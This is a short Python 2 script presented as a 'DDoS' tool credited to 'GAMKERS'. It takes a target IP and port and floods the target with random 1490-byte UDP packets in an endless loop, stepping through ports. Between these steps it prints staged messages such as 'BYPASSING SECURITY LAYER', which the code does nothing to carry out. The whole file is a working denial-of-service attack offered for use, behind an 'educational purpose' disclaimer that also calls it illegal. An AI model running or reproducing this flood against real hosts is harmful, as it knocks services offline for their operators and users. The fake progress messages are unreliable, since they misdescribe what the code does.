print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet GAMKERS-DDOS")
print
print "Coded By : GAMKERS"
print "Author   : GAMKERS"
print "Github   : github.com/gamkers"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print("Team : T34m V18rs")
print ("\033[92m")
print "TRYING TO REACH THE SERVER"
time.sleep(5)
print "ESTABLISHING CONNECTION"
time.sleep(5)
print "BYPASSING SECURITY LAYER"
time.sleep(5)
print "CONNECTION ESTABLISHED"
time.sleep(5)
print "DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
